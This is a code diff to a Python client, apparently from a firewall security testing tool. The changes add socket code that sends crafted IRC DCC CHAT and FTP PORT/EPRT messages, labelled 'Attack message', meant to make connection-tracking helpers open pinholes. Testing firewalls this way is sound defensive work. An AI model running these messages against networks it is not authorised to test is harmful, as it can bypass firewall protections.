@@ -18,6 +18,7 @@
 
 # simple client: connect to a server for a protocol and send
 # a command activating helper to it.
+import socket
 
 class generic_client:
     def __init__(self, ip, srv_port, port, verbose = False):
@@ -26,28 +27,47 @@ class generic_client:
         self.port = port
         self.l3proto = 'IPv4'
         self.verbose = verbose
+        self.conn = None
 
     def connect(self):
+        family = socket.AF_INET
+        if not self.l3proto == 'IPv4':
+            family = socket.AF_INET6
+        self.conn = socket.socket(family, socket.SOCK_STREAM)
+        self.conn.connect((self.ip, self.srv_port))
 
     def send_command(self):
-        send(self.conn, self.message)
+        self.conn.sendall(self.message)
 
     def run(self):
+        self.message = self.build_command()
+        if self.verbose:
+            print "Attack message:\n%s\n" % self.message
+        self.connect()
+        self.send_command()
 
     def build_command(self):
         return ""
 
 class irc(generic_client):
+    def ipnumber(self, ip):
+        ip=ip.rstrip().split('.')
+        ipn=0
+        while ip:
+            ipn=(ipn<<8)+int(ip.pop(0))
+        return ipn
     def build_command(self):
-        return 'PRIVMSG opensvp :\x01DCC CHAT CHAT %d %d\x01\r\n' % (self.ipnumber(self.ip), self.port)
+        ipaddr = socket.gethostbyname(self.ip)
+        return 'PRIVMSG opensvp :\x01DCC CHAT CHAT %d %d\x01\r\n' % (self.ipnumber(ipaddr), self.port)
 
 class ftp(generic_client):
     def build_command(self):
-        return "Banzai"
+        ipaddr = socket.gethostbyname(self.ip)
+        return 'PORT %s,%d,%d\r\n' % (ipaddr.replace('.',','), self.port >> 8 & 0xff, self.port & 0xff)
 
 class ftp6(generic_client):
     def __init__(self, iface, ip, port, verbose = False):
         ftp.__init__(self, iface, ip, port, verbose)
         self.l3proto = "IPv6"
     def build_command(self):
-        return "Banzai"
+        return 'EPRT |2|%s|%d|\r\n' % (self.ip, self.port)
